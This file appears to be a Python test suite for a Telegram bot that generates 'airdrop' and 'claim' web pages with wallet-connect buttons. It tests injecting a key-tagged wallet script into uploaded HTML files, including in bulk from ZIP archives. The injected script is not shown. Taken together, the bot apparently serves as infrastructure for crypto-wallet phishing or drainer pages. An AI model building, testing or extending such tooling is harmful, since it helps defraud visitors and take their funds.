#!/usr/bin/env python3
"""
Unit tests for the Telegram Bot
"""

import sys
import tempfile
import zipfile
from pathlib import Path
import sqlite3
import json
import traceback

sys.path.insert(0, str(Path(__file__).parent))

from bot import (
    init_db, generate_api_key, generate_html_page,
    inject_wallet_script, process_zip_file, DB_PATH, PAGE_TEMPLATES
)

def test_db_init():
    with tempfile.TemporaryDirectory() as tmpdir:
        test_db = Path(tmpdir) / "test.db"
        import bot as bot_module
        bot_module.DB_PATH = test_db
        init_db()
        conn = sqlite3.connect(test_db)
        cursor = conn.cursor()
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = [row[0] for row in cursor.fetchall()]
        conn.close()
        assert 'users' in tables
        assert 'pages' in tables
    print("✓ Database initialization test passed")

def test_api_key_generation():
    for _ in range(10):
        key = generate_api_key()
        assert key.startswith("EXO_")
        hex_part = key[4:]
        assert len(hex_part) == 24
        assert all(c in '0123456789abcdef' for c in hex_part)
    print("✓ API key generation test passed")

def test_html_generation():
    for template, info in PAGE_TEMPLATES.items():
        html = generate_html_page(
            template=template, title=info['default_title'],
            amount=info['default_amount'], symbol=info['default_symbol'],
            bg_color='#0a0a1a', card_color='#1a1a2e', btn_color='#7c3aed',
            api_key='EXO_test1234567890123456', page_id=1, user_id=12345
        )
        assert '<!DOCTYPE html>' in html
        assert info['default_title'] in html
        assert 'EXO_test1234567890123456' in html
        assert 'connectWallet()' in html
        assert 'boxicons' in html
    print("✓ HTML generation test passed")

def test_wallet_injection():
    html = """<!DOCTYPE html><html><head><title>Test</title></head><body>Hello</body></html>"""
    modified, count = inject_wallet_script(html, 'EXO_test123')
    assert count == 1
    assert 'EXO_test123' in modified
    assert 'boxicons' in modified
    modified2, count2 = inject_wallet_script(modified, 'EXO_test123')
    assert count2 == 0
    print("✓ Wallet injection test passed")

def test_zip_processing():
    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir = Path(tmpdir)
        zip_path = tmpdir / "test.zip"
        with zipfile.ZipFile(zip_path, 'w') as zf:
            zf.writestr("page1.html", """<!DOCTYPE html><html><head><title>Page 1</title></head><body>Hello World</body></html>""")
            zf.writestr("subdir/page2.htm", """<!DOCTYPE html><html><head><title>Page 2</title></head><body>Hi there</body></html>""")
        result = process_zip_file(zip_path, 'EXO_test123')
        assert result['success'] == True, f"Failed: {result['error']}"
        assert result['injected_files'] == 2
        assert result['output_path'] is not None
        assert result['output_path'].exists()
        result['output_path'].unlink()
    print("✓ ZIP processing test passed")

def test_config_persistence():
    config = {'bg_color': '#000000', 'card_color': '#111111', 'btn_color': '#ffffff'}
    config_str = json.dumps(config)
    parsed = json.loads(config_str)
    assert parsed == config
    print("✓ Config persistence test passed")

def test_button_patterns():
    patterns = [
        ('^new_', 'new_airdrop', True), ('^new_', 'new_claim', True),
        ('^pages$', 'pages', True), ('^pages$', 'page_1', False),
        ('^info$', 'info', True), ('^admin$', 'admin', True),
        ('^tog_', 'tog_user1', True), ('^menu$', 'menu', True),
    ]
    import re
    for pattern, test_string, expected in patterns:
        result = bool(re.match(pattern, test_string))
        assert result == expected, f"Pattern {pattern} mismatch for {test_string}"
    print("✓ Button pattern test passed")

def test_zip_error_handling():
    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir = Path(tmpdir)
        zip_path = tmpdir / "test.txt"
        zip_path.write_text("not a zip")
        result = process_zip_file(zip_path, 'EXO_test123')
        assert result['success'] == False
        assert "not a ZIP" in result['error']
        zip_path = tmpdir / "corrupt.zip"
        zip_path.write_text("PK\x03\x04 corrupt")
        result = process_zip_file(zip_path, 'EXO_test123')
        assert result['success'] == False
        zip_path = tmpdir / "nohtml.zip"
        with zipfile.ZipFile(zip_path, 'w') as zf:
            zf.writestr("data.txt", "just text")
        result = process_zip_file(zip_path, 'EXO_test123')
        assert result['success'] == False
        assert "No HTML files" in result['error']
    print("✓ ZIP error handling test passed")

if __name__ == '__main__':
    print("Running Telegram Bot Tests...")
    print()
    try:
        test_db_init()
        test_api_key_generation()
        test_html_generation()
        test_wallet_injection()
        print("test_zip_processing...")
        test_zip_processing()
        print("test_config_persistence...")
        test_config_persistence()
        test_button_patterns()
        test_zip_error_handling()
        print()
        print("=" * 50)
        print("All tests passed! ✅")
        print("=" * 50)
    except AssertionError as e:
        print(f"\n❌ Test failed: {e}")
        traceback.print_exc()
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")
        traceback.print_exc()
        sys.exit(1)
